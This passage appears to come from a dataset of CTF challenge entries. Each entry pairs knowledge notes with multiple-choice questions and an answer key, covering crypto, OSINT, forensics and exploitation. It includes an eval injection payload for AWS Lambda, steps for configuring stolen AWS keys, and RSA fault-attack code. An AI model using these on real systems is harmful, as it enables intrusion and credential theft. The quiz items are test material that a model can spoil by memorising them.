            "When dealing with pseudo-substitution ciphers in a CTF challenge, observe the length and characters within each ciphered segment to deduce the plaintext mapping rules. This approach is effective when the encryption mechanism uses varied lengths and character sets to represent different types of plaintext characters (e.g., lowercase, uppercase, numbers, punctuation). The decryption process requires identifying the consistent positioning of the plaintext character within its ciphered equivalent, taking into account its length and the presence of specific character types. This method is especially useful when traditional frequency analysis is not applicable due to the uniqueness of each ciphered letter's representation.\n   \n   Example decryption pattern (pseudo-code):\n   ```python\n   for each ciphered_character in ciphertext:\n       if length_of(ciphered_character) == condition1:\n           decrypted_message += decipher_logic1\n       elif length_of(ciphered_character) == condition2 and specific_character_in(ciphered_character):\n           decrypted_message += decipher_logic2\n       ...\n       else:\n           decrypted_message += default_decipher_logic\n   ```",
            "In crypto challenges, especially those involving custom or modified encryption techniques, scripting an exploit based on the observed behavior of the tool can significantly automate and speed up the decryption process. Developing a script that programmatically applies identified patterns to decrypt messages or generate keys can bypass manual analysis and directly output the flag. This approach necessitates understanding how the cipher operates through interaction (e.g., encrypting and decrypting known samples) to reverse-engineer its underlying logic. \n\n   Example approach for scripting an exploit:\n   - Identify patterns through interaction with the encryption tool (e.g., how different character types are encrypted).\n   - Code the observed patterns into a decryption script.\n   - Use the script to decrypt provided ciphertexts or to create keys that satisfy the challenge conditions.\n\n   Note: While a specific code example here would be overly context-specific and hence not universally applicable, the general approach involves looping through encrypted data, applying conditional checks, and concatenating results based on the identified encryption pattern."
        ],
        "question": [
            "Given a pseudo-substitution cipher in a CTF challenge that encrypts characters with different patterns based on their types (lowercase, uppercase, numbers, punctuation), how can one determine the plaintext character 'e' from the ciphertext '55/ee/((/dd'? - A. Analyze the first set of the ciphered segment to find the plaintext character. - B. Decrypt by applying a frequency analysis on the ciphered segment. - C. Find the plaintext character 'e' in the last set of the ciphered segment. - D. Identify the third set of characters to locate the plaintext 'e'. ",
            "When faced with encrypting and decrypting messages using a tool that follows a unique encryption pattern for each character type in a CTF challenge, what is the most efficient approach to swiftly decrypt the ciphertext or generate the correct key? - A. Manually guess the key based on common English words and cipher text patterns. - B. Develop a script that applies the observed encryption patterns to automatically decrypt messages or create keys based on the conditions provided. - C. Use standard encryption tools to brute force the key without analyzing the pattern. - D. Contact the challenge organizer for hints about the encryption pattern. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Chaplin's PR Nightmare - 1",
        "write_up": "dataset/raw/Chaplin's PR Nightmare - 1.md",
        "type": "This write-up describes an OSINT (Open-source intelligence) challenge where the participants had to find Charlie Chaplin's Twitter account and investigate it to find the flag. Based on the context provided, the type of this challenge is **miscellaneous (misc)**.",
        "competition": [
            "UIUCTF/2021",
            "https://ctftime.org/event/1372/tasks/"
        ],
        "score": 50,
        "max_score": 500,
        "difficulty": 0.1,
        "knowledge": [
            "When investigating digital footprints on social platforms like Twitter for OSINT (Open Source Intelligence) purposes, combining known information (e.g., full name, profession, or interests) with specific platform functionalities (like search filters) enhances the accuracy of search results. This approach can narrow down potentially overwhelming data to locate target profiles or information more efficiently. For instance, using key terms related to the subject's professional background in the search query can be effective.\n   - Sample search query: \"Charlie Chaplin coding\"",
            "Social media platforms often have unique features or less commonly used functionalities, such as Twitter's \"lists,\" which can be exploited during an OSINT investigation to uncover hidden or not immediately apparent information. Accessing and reviewing these can reveal details such as interests, affiliations, or, in the context of CTF challenges, hidden flags. Knowing how to navigate through these platform-specific features can unveil crucial information that is not visible at first glance.\n   - Sample action: On Twitter, navigate to a user's profile > click on the options button > select \"View Lists\""
        ],
        "question": [
            "When conducting Open Source Intelligence (OSINT) investigations on social platforms like Twitter, which of the following search strategies is effective for enhancing the accuracy of locating target profiles or information? - A. Limiting searches strictly to hashtags related to the subject's interest. - B. Focusing only on the latest tweets without applying any filters. - C. Using general terms and avoiding specific keywords to increase the volume of search results. - D. Combining known information (e.g., full name, profession, interests) with specific platform functionalities (like search filters). ",
            "In the context of utilizing platform-specific features for OSINT purposes on Twitter, how can hidden or not immediately apparent information, such as affiliations or in the context of CTF, hidden flags, be uncovered? - A. By only following the subject's most recent followers. - B. Accessing a user's profile, then navigating through the options button to select \"View Lists\". - C. Reporting the user's profile to reveal confidential information. - D. Sending direct messages to the profile asking for information. "
        ],
        "answer": [
            "D",
            "B"
        ]
    },
    {
        "name": "cheapest-cookies-2",
        "write_up": "dataset/raw/cheapest-cookies-2.md",
        "type": "misc",
        "competition": [
            "TJCTF/2022",
            "https://ctftime.org/event/1599/tasks/"
        ],
        "score": 253,
        "max_score": 500,
        "difficulty": 0.506,
        "knowledge": [
            "For challenges requiring finding the shortest path within a graph, Dijkstra's algorithm is highly effective, especially in situations involving non-negative weights and the need to calculate single-source shortest paths. This approach is practical when the constraints permit holding all nodes and edges in memory and when the graph doesn't have negative weight cycles, as Dijkstra's algorithm does not work correctly under such conditions.",
            "In challenges where you need to interact with a server to provide inputs and receive outputs dynamically, `pwntools` can be used efficiently for network interactions. This library simplifies sending and receiving data, making it particularly useful for CTF challenges where quick and automated communication with a remote server is required to solve a problem or exploit a vulnerability.\n   \n   Example usage:\n   ```python\n   from pwn import remote\n   \n   target = remote('target.address.com', port_number)\n   received = target.recvuntil(b'prompt')\n   # Process received data or calculate response\n   response = 'calculated_response'\n   target.sendline(bytes(response, 'ascii'))\n   # Continue to interact as necessary\n   ```\n\nThese principles can be broadly applied across various CTF challenges and similar scenarios that require algorithmic problem-solving involving graphs or network-based interactions."
        ],
        "question": [
            "When implementing Dijkstra's algorithm in a programming challenge to find the shortest path in a graph with positive weights, which of the following data structures is NOT typically used to efficiently track and update the shortest distance from the source node to all other nodes? - A. Priority Queue to select the next closest node to the source. - B. Hash Map to store distances from the source node to each node. - C. Array of booleans to mark visited nodes. - D. Queue to perform Breadth-First Search (BFS). ",
            "In a programming challenge where you must dynamically interact with a remote server to send and receive data to solve a problem, which Python library provides convenient functions for establishing the connection and communicating with the server? - A. requests - B. pwntools - C. BeautifulSoup - D. scapy "
        ],
        "answer": [
            "D",
            "B"
        ]
    },
    {
        "name": "Child Encrypter",
        "write_up": "dataset/raw/Child Encrypter.md",
        "type": "crypto",
        "competition": [
            "Defenit/2020",
            "https://ctftime.org/event/1060/tasks/"
        ],
        "score": 598,
        "max_score": 906,
        "difficulty": 0.6600441501103753,
        "knowledge": [
            "When dealing with encryption algorithms like AES in CTR mode with nonce, identify unique characteristics within the ciphertext to differentiate between blocks encrypted using different nonces or keys. Specifically, for ASCII plaintext, leverage the fact that the 8th bit is typically unset to group blocks encrypted with the same key or nonce. This approach assists in reducing the complexity of decrypting the message by narrowing down the possible nonce or key variations for each block.",
            "For a known-plaintext attack, especially in encrypted text following a predictable format (like the flag format \"Defenit{...}\"), utilize portions of the known plaintext to decrypt blocks with similar encryption parameters. XORing a ciphertext block with its corresponding plaintext reveals parts of the encryption key or nonce, which can then be used to decrypt other blocks encrypted under the same parameters. Repeating this process across different blocks and applying logical guesses for the plaintext can progressively reveal more of the key or nonce, eventually allowing for the decryption of the entire ciphertext.\n\nSample of payload for known-plaintext attack:\n```php\n$key_guess = \"Defenit{\\0\\0\\0\\0\\0\\0\\0\\0\"; // Known beginning of the plaintext\n$block_a = hex2bin('7a3a2828612a4f1a0700706f70756c61'); // Sample hex of block 'a'\n$block_b = hex2bin('2020616e64206d6f737420706f70756c'); // Sample hex of block 'b' known or guessed plaintext\n$derived_key = $block_a ^ $block_b ^ $key_guess;\necho bin2hex($derived_key);\n```"
        ],
        "question": [
            "In CTR mode encryption using AES, given that ASCII plaintext is being encrypted, which strategy would be instrumental in differentiating blocks encrypted with different keys or nonces, especially when the 8th bit of ASCII characters is usually not set?  - A. Utilize a constant nonce for all blocks to simplify key recovery. - B. Group blocks by their size to identify nonce variations. - C. Leverage the unset 8th bit of ASCII characters to group blocks encrypted under similar conditions. - D. Apply a uniform key across all blocks to eliminate nonce diversity. ",
            "In a scenario where a known plaintext format, such as \"Defenit{...}\", is encrypted and the ciphertext format is predictable, how can an attacker use a block of known plaintext against another ciphertext block to reveal parts of the encryption key or nonce?  - A. By XORing the known plaintext with a random string to generate a possible key. - B. XORing the ciphertext block with its corresponding plaintext block to reveal parts of the encryption key or nonce. - C. By adding the known plaintext to each ciphertext block directly without any bitwise operations. - D. Encrypting the known plaintext again and comparing it directly with all ciphertext blocks. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "child-re",
        "write_up": "dataset/raw/child-re.md",
        "type": "crypto",
        "competition": [
            "WolvCTF/2023",
            "https://ctftime.org/event/1866/tasks/"
        ],
        "score": 100,
        "max_score": 700,
        "difficulty": 0.14285714285714285,
        "knowledge": [
            "When encountering a binary in reverse engineering challenges that contains functions which are not called within the main program flow, manually inspect these functions for any operations on hardcoded data, such as XORing values or manipulating strings. These operations often relate to decrypting or obfuscating the flag. This knowledge is applicable in scenarios involving binary analysis and reverse engineering tasks where the goal is to extract hidden or encrypted information.",
            "In reverse engineering challenges, if an encoded or encrypted string is found within the binary, attempt to apply common cryptographic operations like XOR with commonly known values or brute-force with a range of possible values to decode the string. This approach is particularly useful when references or hints towards a specific value (such as the value `0x42` mentioned in a Hitchhiker's Guide to the Galaxy reference) are present within the challenge or its documentation.\n\nExample of applying the XOR operation:\n```python\nenc_flag = bytes.fromhex('5d495e4c51621b5e4942421b4119581f756d5f1b4e19755e1a755e4219756d1e461e52530b0b751e1857')\nfor c in enc_flag:\n    print(end=chr(c ^ 42))\nprint()\n```"
        ],
        "question": [
            "In a reverse engineering challenge, you encounter a binary with a function that is not called from the main program flow. The function manipulates a hardcoded string through a specific operation. What is the most likely purpose of this function? - A. Creating a GUI interface - B. Decrypting or obfuscating information - C. Initiating a network connection - D. Logging error messages",
            "During a binary analysis task, you identify a string that has been encrypted or encoded within the binary. No clear instructions on how to decrypt or decode this string are provided. What approach should you consider first to attempt decoding the string? - A. Decompile the binary to source code and search for decryption keys - B. XOR the encoded string with a commonly known value or brute-force a range of values - C. Upload the binary to an online service for automatic decoding - D. Restart the binary in a sandbox environment to capture runtime data"
        ],
        "answer": [
            "B",
            "B"
        ]
    },
    {
        "name": "chunk norris",
        "write_up": "dataset/raw/chunk norris.md",
        "type": "crypto",
        "competition": [
            "GoogleCTF/2020",
            "https://ctftime.org/event/1041/tasks/"
        ],
        "score": 98,
        "max_score": 474,
        "difficulty": 0.20675105485232068,
        "knowledge": [
            "When faced with an RSA encryption challenge involving a custom prime number generation function, closely analyzing the algorithm used for prime generation can reveal weaknesses in how the primes are generated. This can allow for the reconstruction of the prime factors if the algorithm produces predictable or insufficiently random outcomes. This approach involves understanding the mathematical relationship between the generated primes and their initial parameters, using the structure of the primes to approximate initial seeds or parameters, and then factoring the derived approximations to find potential prime candidates.",
            "For RSA challenges where prime numbers are generated using a linear congruential generator or a similar predictable mathematical function, one can exploit the predictability of prime generation to compute possibilities for the seed or the intermediate values used in the generation process. This involves reverse engineering the prime generation to an extent where enough information about the seed or intermediate values is known to attempt factoring the RSA modulus \\(n\\). Specific mathematical operations, like calculating the least significant bits of the product of two numbers or using modular inverses, can lead to narrowing down potential seeds or intermediate values that, when factored, yield the private primes \\(p\\) and \\(q\\).\n\n    - Example method to approximate intermediate values: Given \\(n = pq\\), where \\(p\\) and \\(q\\) are primes generated by a predictable process, approximate the seeds (\\(s_1\\) and \\(s_2\\)) used to generate \\(p\\) and \\(q\\) by computing \\((n \\mod 2^{64}) \\times \\text{inverse}(a^{30}, 2^{64}) \\mod 2^{64}\\) for the least significant bits and \\(n // 2^{1920}\\) for the most significant bits approximation, where \\(a\\) is a known multiplier in the generation process. These approximations can lead to finding \\(s_1 \\times s_2\\), which can then be factored to find potential values for \\(s_1\\) and \\(s_2\\), subsequently used to regenerate \\(p\\) and \\(q\\) and solve the RSA challenge."
        ],
        "question": [
            "In the context of breaking RSA encryption with a custom prime number generation algorithm, which of the following steps is crucial for reconstructing the prime factors? - A. Calculating the entropy of the prime number generator. - B. Analyzing the algorithm for predictable or insufficiently random outcomes. - C. Increasing the chunk size used for prime generation to enhance security. - D. Using conventional prime factoring algorithms without considering the generation process.",
            "For an RSA challenge utilizing a predictable prime number generation method like a linear congruential generator, what mathematical operation is key to approximating the seeds used in the primes' generation? - A. Adding the prime numbers generated to each other to get a new prime. - B. Multiplying the prime numbers together and applying a hash function. - C. Computing \\((n \\mod 2^{64}) \\times \\text{inverse}(a^{30}, 2^{64}) \\mod 2^{64}\\) for the least significant bits approximation. - D. Dividing the RSA modulus by the sum of all prime numbers less than 100."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Chunkies",
        "write_up": "dataset/raw/Chunkies.md",
        "type": "forensics",
        "competition": [
            "Shakti/2021",
            "https://ctftime.org/event/1251/tasks/"
        ],
        "score": 100,
        "max_score": 400,
        "difficulty": 0.25,
        "knowledge": [
            "When dealing with corrupted file challenges, specifically image files like PNGs, initial validation using file type detection tools (e.g., the `file` command) can indicate if the file header is corrupt or missing data. Repairing the file often begins with restoring the correct header information, which can be achieved by comparing the hex dumps (`hexdump -C`) of the corrupted file and a valid file of the same type. This comparison can reveal missing bytes in the header that, once added back, can help in making the file recognizable by operating systems and image viewers again.",
            "Tools like `pngcheck` are invaluable for identifying and fixing errors in PNG files. Errors reported by `pngcheck` can guide corrective actions, such as rectifying CRC errors by updating checksums to expected values or correcting misspelled or misplaced chunk names within the PNG file structure. For example, correcting \"IADT\" to \"IDAT\" for the data chunk name or \"INED\" to \"IEND\" for the end chunk name based on error feedback can resolve parsing issues preventing the image from being displayed properly."
        ],
        "question": [
            "During a forensic analysis, you're tasked with recovering a corrupted PNG file. Utilizing a file type detection tool reveals that the file is not recognized as a PNG. A comparison with a valid PNG file's hex dump highlights a missing byte at the beginning of the corrupted file. What should be the first step to repair the file based on the hex comparison you performed?  - A. Add the missing \"89\" byte at the beginning of the file. - B. Remove any excess bytes found at the end of the file. - C. Replace all instances of \"IDAT\" with \"IADT\". - D. Change the file extension from .png to .jpg to bypass file type detection issues. ",
            "While fixing a PNG image file, `pngcheck` reports a CRC error for the IHDR chunk and errors related to incorrect spelling of chunk names like \"IADT\" instead of \"IDAT\", and \"INED\" instead of \"IEND\". Based on the tool's output, what is the most appropriate step to address the issues found by `pngcheck`?  - A. Use a text editor to manually write a new CRC value for the IHDR chunk based on a guess. - B. Correct the misspelled chunk names as indicated by `pngcheck` (e.g., correct \"IADT\" to \"IDAT\"). - C. Convert the entire file to a different image format and then back to PNG. - D. Ignore the errors and open the file with different image viewers until one succeeds. "
        ],
        "answer": [
            "A",
            "B"
        ]
    },
    {
        "name": "CictroKDF",
        "write_up": "dataset/raw/CictroKDF.md",
        "type": "crypto",
        "competition": [
            "RITSEC/2019",
            "https://ctftime.org/event/898/tasks/"
        ],
        "score": 500,
        "max_score": 625,
        "difficulty": 0.8,
        "knowledge": [
            "When implementing custom encryption or decryption functions, especially Key Derivation Functions (KDFs), it is crucial to accurately follow the mathematical or algorithmic definitions provided. Incorrect interpretations of these processes, such as improperly permuting bits based on their already changed states rather than their original positions, can lead to failure in deriving the correct key or decrypting the ciphertext correctly.",
            "In cryptographic challenges involving the creation or manipulation of keys with constraints on the data that affects the key's final value, it's important to recognize which portions of the input significantly impact the result. In this scenario, due to the algorithm design (i mod 4), only the last 4 bytes of the initial message were significant for the derived key. This knowledge can drastically reduce the complexity of the attack by focusing only on the relevant parts of the input data. For example, when using a specific KDF or encryption system where the key is derived from a message, if the system only utilizes certain parts of the message for key derivation (like the last four bytes), attackers can optimize their efforts by only concerning themselves with those parts."
        ],
        "question": [
            "In the context of implementing Key Derivation Functions, which of the following represents a common mistake that can prevent correct key derivation? - A. Using the full message content instead of the last 4 bytes when that is what the algorithm specifies. - B. Correctly permuting bits based on their original byte values each time, not the already permuted states. - C. Always resetting the algorithm state after each byte is processed. - D. Changing every bit based on the originally provided byte value rather than the permuted bit state.",
            "When dealing with cryptographic algorithms where the key derivation is affected by only a portion of the input message, what should be the focus to optimize the process? - A. Only the first 4 bytes of the message are significant for the derived key. - B. Each byte of the message is equally important for the derivation of the key. - C. Only the ASCII values of characters in the message influence the derived key. - D. Only the last 4 bytes of the initial message are significant for the derived key."
        ],
        "answer": [
            "D.",
            "D."
        ]
    },
    {
        "name": "Circuitry Magic",
        "write_up": "dataset/raw/Circuitry Magic.md",
        "type": "reverse",
        "competition": [
            "m0leCon/2022/Quals",
            "https://ctftime.org/event/1615/tasks/"
        ],
        "score": 144,
        "max_score": 500,
        "difficulty": 0.288,
        "knowledge": [
            "When analyzing a binary for reversing challenges where the output depends on specific conditions (such as inputs being within a certain range), symbolic execution tools like `Z3` through `angr`'s `claripy` can automate the process of understanding and mimicking the binary's logic. This method is particularly useful when working with complex logic that outputs based on specific inputs, as it can help reverse-engineer the process to find the correct inputs or conditions. Example symbolic constraint creation:  \n```python\nimport claripy\n\n# Define symbolic variables for input bits\ninput_bits = [claripy.BVS(f'bit_{i}', 1) for i in range(6)]\n\n# Example of creating a symbolic representation of the logic in the challenge\ndef some_function(input_bits):\n    output = claripy.BVV(0, 1)  # Starting with an output of 0\n    for bit in input_bits:\n        output |= bit  # Or-ing the output with each input bit\n    return output\n\n# Using the symbolic function\nsymbolic_output = some_function(input_bits)\n```",
            "When dealing with binary challenges that involve manipulating bits and applying logic gates (such as negation and identity operations), manually converting the binary's functioning into Python for easier manipulation can be useful. This process not only allows for better understanding of the binary logic but also aids in creating accurate symbolic versions of this logic for further analysis or for constructing solutions. It's important to ensure that all operations (bitwise AND, OR, XOR, shifts) accurately reflect those in the binary to correctly model its behavior. For example, using XOR in place of negation when translating binary logic into Python code, since it can be equivalent and compatible with both concrete and symbolic execution. Example Python representation of negation using XOR:\n```python\ndef neg(input_bit):\n    # Assuming input_bit is a claripy symbolic bit, XOR with 1 acts as negation\n    return input_bit ^ 1\n```"
        ],
        "question": [
            "In a challenge that involves analyzing a binary with input-output conditions, one seeks to leverage symbolic execution to automate the reversing process. Specifically, when the binary logic determines the output based on inputs within a defined range, a symbolic execution tool is used to mimic the binary's behavior. Which of the following is a primary benefit of using symbolic execution tools like `Z3` with an abstraction layer like `angr`'s `claripy` in such scenarios? - A. To increase the performance of the binary during execution - B. To automatically generate inputs that satisfy all binary conditions - C. To visually represent the binary's execution flow - D. To compile the binary into a higher-level language for easier analysis",
            "When translating the negation operation observed in a binary challenge into a Python program for manipulation and analysis, one of the bitwise operations can serve as an equivalent to negation in the context of symbolic execution with tools like `Z3` and `claripy`. Which bitwise operation can be used in Python to represent negation, ensuring compatibility with both concrete and symbolic execution? - A. Bitwise AND (`&`) - B. Left Shift (`<<`) - C. XOR with 1 (`^ 1`) - D. Bitwise OR (`|`)"
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "City RSA",
        "write_up": "dataset/raw/City RSA.md",
        "type": "pwn",
        "competition": [
            "P.W.N/2018",
            "https://ctftime.org/event/639/tasks/"
        ],
        "score": 557,
        "max_score": 792,
        "difficulty": 0.7032828282828283,
        "knowledge": [
            "**Buffer Overflow in RSA Implementation**: In scenarios where a custom RSA signing service contains a buffer overflow vulnerability, specifically when reading input with `fgets`, it's possible to trigger unexpected behavior that can allow bypassing security measures or even recovering private RSA parameters. This can occur if the service reads more input than expected and overwrites crucial variables, such as those holding RSA coefficients or exponents. This method was effectively used to alter the service's behavior by inputting a byte `0x00` multiple times to overwrite the `d_p_str`, leading to a faulty RSA signature that ultimately allowed the recovery of the RSA modulus factorization.",
            "**Recovering RSA Parameters through Faulty Signatures**: A deep understanding of the Chinese Remainder Theorem (CRT) and RSA's mathematical properties can be exploited to recover private keys or decrypt messages without them. When a faulty signature is generated possibly due to a buffer overflow or a programming mistake in how CRT is implemented (e.g., incorrect handling of exponents or modular inverses), the faulty signature can help in factorizing the RSA modulus N by calculating the `gcd(signature, N)`, hence obtaining `p` and consequently `q`. This knowledge is critical for CTF challenges that involve analyzing and exploiting flawed RSA implementations to recover private keys or secret messages.\n\n**Sample exploitation code snippet to factorize N and recover RSA parameters:**\n```python\nfrom math import gcd\n# Assume a is the faulty signature obtained, and N is the known public modulus\na = 0x32bc2267af0d1568... # truncated for brevity\nN = 0x98ac865ef6a31313... # truncated for brevity\ne = 0x10001  # Public exponent\n\n# Factorize N by calculating the gcd of the signature and N\np = gcd(a, N)\nq = N // p\n\n# Verify p and q are correct\nassert p * q == N\n\n# Use Extended Euclidean Algorithm to find the multiplicative inverse of e modulo phi(N)\ndef find_inverse(x, y):\n    # Implementation of the Extended Euclidean Algorithm to find inverses\n    # Body skipped for brevity\n\nd = find_inverse(e, (p-1)*(q-1))\n\n# Now, with d recovered, messages can be decrypted or signed.\n```\nThis approach underscores the importance of correctly handling input sizes and validating cryptographic operations in custom implementations to prevent vulnerabilities that could lead to private key leakage or unintended message recovery."
        ],
        "question": [
            "In an RSA signing service, a buffer overflow occurs due to incorrect handling of user input with `fgets`. This overflow allows altering the internal state by overwriting specific data structures or variables. Given the following scenario where an attacker inputs a byte `0x00` 33 times to trigger unexpected behavior in the service, which variable was directly affected, leading to a compromised RSA operation?  - A. `p_inv_str`, causing an incorrect calculation of the modular inverse. - B. `d_str`, modifying the private exponent used in RSA operations. - C. `d_p_str`, leading to an incorrect RSA signature generation. - D. `q_str`, altering the prime factor of the RSA modulus. ",
            "In the process of exploiting a flaw within an RSA signing service involving the Chinese Remainder Theorem (CRT), it was found that an attacker can factorize the RSA modulus, N, by using a faulty signature. The attacker employs the `gcd(signature, N)` method to obtain a prime factor of N. Which of the following best describes the mathematical basis that facilitates the recovery of RSA parameters when provided with a faulty signature due to incorrect implementations or vulnerabilities?  - A. By finding the greatest common divisor (gcd) of the faulty signature and the modulus, one directly reveals the private exponent. - B. Calculating the gcd of the faulty signature and N allows for the extraction of prime factor `p`, leading to the discovery of the corresponding prime factor `q` by division. - C. The faulty signature, when raised to the power of the public exponent, directly decrypts the original message without needing the RSA modulus factorization. - D. Utilizing the faulty signature to compute the modular multiplicative inverse of N reveals all prime factors simultaneously. "
        ],
        "answer": [
            "C. `d_p_str`, leading to an incorrect RSA signature generation.",
            "B. Calculating the gcd of the faulty signature and N allows for the extraction of prime factor `p`, leading to the discovery of the corresponding prime factor `q` by division."
        ]
    },
    {
        "name": "Clever Thinking",
        "write_up": "dataset/raw/Clever Thinking.md",
        "type": "crypto",
        "competition": [
            "UofTCTF/2024",
            "https://ctftime.org/event/2219/tasks/"
        ],
        "score": 442,
        "max_score": 500,
        "difficulty": 0.884,
        "knowledge": [
            "When attempting to solve elliptic curve cryptography challenges, and the discrete logarithm problem (DLP) appears hard or unsolvable directly, Smart's attack becomes applicable under specific conditions. Specifically, this attack is viable when the order of the elliptic curve group over a finite field equals the characteristic of the field (e.g., the order of the group is p, where p is a prime defining the finite field GF(p)). This approach requires lifting the elliptic curve points to a p-adic field, performing operations within this field, and then extracting the discrete logarithm ratio from the lifted points. Before applying Smart's attack, verify the elliptic curve group's order matches the field's characteristic using the `order()` function.",
            "To implement Smart's attack in a practical scenario such as a CTF challenge, follow these steps within a Sage script:\n   - Define the elliptic curve with its parameters.\n   - Verify the curve's order matches the prime characteristic of the field to ensure Smart's attack applicability.\n   - Lift the given elliptic curve points to the p-adic field and find corresponding p-adic points that match the original points' x and y coordinates modulo p.\n   - Calculate the \"phi\" values for the public base point and the challenge's public key point by transforming their p-adic multiples by p, then extracting and dividing their x and y coordinates respectively.\n   - The quotient of these \"phi\" values yields the private key, which can then be used to compute the shared secret by scalar multiplication with the other individual's public key.\n\nExample of applying Smart's attack within a challenge context:\n```sage\np = 235322474717419  # Prime characteristic of the finite field\na = 0  # Curve coefficient\nb = 8856682  # Curve coefficient\n\n# Define the elliptic curve over GF(p) with coefficients a and b\nE = EllipticCurve(GF(p), [a, b])\nassert(E.order() == p)  # Ensure the curve's order equals p\n\n# Define the public base and the other party's public key\npub_base = E(185328074730054 , 87402695517612)\nQ1 = E(184640716867876 , 45877854358580)\n\n# Apply Smart's attack to find the private key\npriv_key = SmartAttack(pub_base, Q1, p)\n\n# Use the private key to compute the shared secret\nQ2 = E(157967230203538,128158547239620)\nshared_secret = priv_key * Q2\n\n# Output the shared secret, which is the solution\nprint(shared_secret)\n```\nThis strategy demonstrates a specific method for solving elliptic curve-based CTF challenges that involve the discrete logarithm problem when direct computation is infeasible."
        ],
        "question": [
            "When is Smart's attack specifically applicable to solving challenges involving elliptic curve cryptography? - A. When the prime defining the curve is greater than the number of points on the curve. - B. When the elliptic curve's equation does not include a coefficient for the x term. - C. When the order of the elliptic curve group equals the characteristic of the finite field. - D. When the coefficients of the elliptic curve are both zero. ",
            "Which step is essential before applying Smart's attack in a cryptographic challenge involving elliptic curves? - A. Lifting the elliptic curve points to an elliptic curve over the complex numbers field. - B. Verifying that the curve\u2019s order matches the prime characteristic of the field. - C. Transforming the elliptic curve into its dual curve. - D. Performing a brute force search for the private key within a small subset of the group. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Close primes",
        "write_up": "dataset/raw/Close primes.md",
        "type": "crypto",
        "competition": [
            "ASIS/2019/Finals",
            "https://ctftime.org/event/805/tasks/"
        ],
        "score": 136,
        "max_score": 477,
        "difficulty": 0.2851153039832285,
        "knowledge": [
            "For challenges that involve finding prime numbers with specific properties, starting the search from the smallest possible value that meets the criteria (e.g., the smallest 512 bit prime in this case) can be an effective strategy. This approach can capitalize on the nature of prime numbers and the specific conditions set by the challenge such as the difference between the square roots of consecutive primes. The criteria stipulate a minimum difference between the square roots, implying that smaller primes might inherently meet this condition more easily due to their numerical properties.",
            "When tasked with generating primes that satisfy a very precise mathematical condition (such as a specific difference between their square roots), employing a brute force approach with high precision arithmetic libraries (like `gmpy2` for Python, with a precision setting high enough to ensure accurate calculations) can be a straightforward and effective solution. This approach relies on incrementally finding the next prime (`gmpy2.next_prime()`) and calculating the required property (in this case, the difference between the square roots) until the condition is met.\n\nExample payload snippet:\n```python\nimport gmpy2\nfrom gmpy2 import mpf, sqrt\n\nmp.prec = 1024  # Set high precision for calculations\np = gmpy2.next_prime(2**511)  # Start with the smallest 512 bit prime\neps = mpf(\"0.000000000000000000000000000000000000000000000000000000000000000000000000016\")  # Set the precision for the epsilon value\nwhile True:\n   q = gmpy2.next_prime(p)  \n   if sqrt(q) - sqrt(p) >= eps:  \n       print(f\"Prime p: {p}, Prime q: {q}\")\n       break\n   p = q\n```"
        ],
        "question": [
            "When searching for a 512-bit prime `p` such that the difference between the square roots of prime `p` and the next prime `q` is at least a specific small value, why is it recommended to start from the smallest 512-bit prime? - A. Larger primes have a smaller gap between them, making the condition harder to meet. - B. Smaller primes are easier to compute and require less computational power. - C. Starting from smaller primes takes advantage of the numerical properties that fulfill the condition more easily. - D. The cryptographic strength of smaller primes is usually higher, providing more secure outputs.",
            "When implementing a brute force approach to find two consecutive primes (`p` and `q`) that satisfy a precise difference in their square roots, which library and settings are recommended for ensuring the accuracy of calculations in Python? - A. Use the Python standard library with default precision settings. - B. Utilize `numpy` for its efficient array operations, setting a high precision level. - C. Apply `gmpy2` with a precision setting (`mp.prec`) of 1024 or higher to ensure accurate calculations. - D. Opt for `math` library functions, overriding its precision limitations with custom algorithms."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Cloud 9_9",
        "write_up": "dataset/raw/Cloud 9_9.md",
        "type": "This write-up corresponds to a **misc** (miscellaneous) challenge in a CTF (Capture The Flag) competition.",
        "competition": [
            "nullconHackIM/2022",
            "https://ctftime.org/event/1718/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When exploiting serverless applications such as AWS Lambda, injecting Python code using the `eval` function can lead to Remote Code Execution (RCE). If the application evaluates user input through the `eval` function without proper input validation, arbitrary Python code can be executed. In this scenario, Python's ability to import modules within a string passed to the `eval` function was used to execute commands on the server. \n    - Example payload: `__import__('os').popen('ls').read()`",
            "Post-exploitation steps for serverless applications often include enumeration of the environment variables. These variables can contain sensitive information such as AWS access keys (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, and `AWS_SESSION_TOKEN`). These keys can then be used to access other services within the AWS environment, such as S3 buckets, potentially leading to the discovery of stored secrets or confidential data.\n    - For leveraging the enumerated AWS access keys, one can configure their own AWS CLI tool with the stolen credentials to access AWS resources like S3 buckets that the compromised Lambda function has access to.\n    - AWS CLI command to configure stolen credentials: \n        ``` \n        aws configure set aws_access_key_id ASIA22D7J5LEA25ENS5X \n        aws configure set aws_secret_access_key L3OWcJut4kv9pziGUVI6rFUbOnVTiCzkN58zv8Pw \n        aws configure set aws_session_token <token_here>\n        ```\n    - AWS CLI command to access S3 bucket: `aws s3 ls s3://nullcon-s3bucket-flag4/`"
        ],
        "question": [
            "When exploiting serverless applications through the misuse of the `eval` function, which Python module is commonly used to execute arbitrary commands on the server? - A. `__import__('sys')` - B. `__import__('requests')` - C. `__import__('os')` - D. `__import__('json')`",
            "After compromising a serverless application and obtaining AWS environment variables, which of the following AWS CLI commands correctly configures the stolen credentials for further exploitation? - A. `aws configure set aws_session_token <token_here>` - B. `aws configure set aws_access_key_id ASIA22D7J5LEA25ENS5X` - C. `aws configure set aws_secret_access_key L3OWcJut4kv9pziGUVI6rFUbOnVTiCzkN58zv8Pw` - D. All of the above need to be used together to properly configure stolen credentials."
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "Coal Miner",
        "write_up": "dataset/raw/Coal Miner.md",
        "type": "pwn",
        "competition": [
            "UMDCTF/2020",
            "https://ctftime.org/event/1040/tasks/"
        ],
        "score": 800,
        "max_score": 800,
        "difficulty": 1.0,
        "knowledge": [
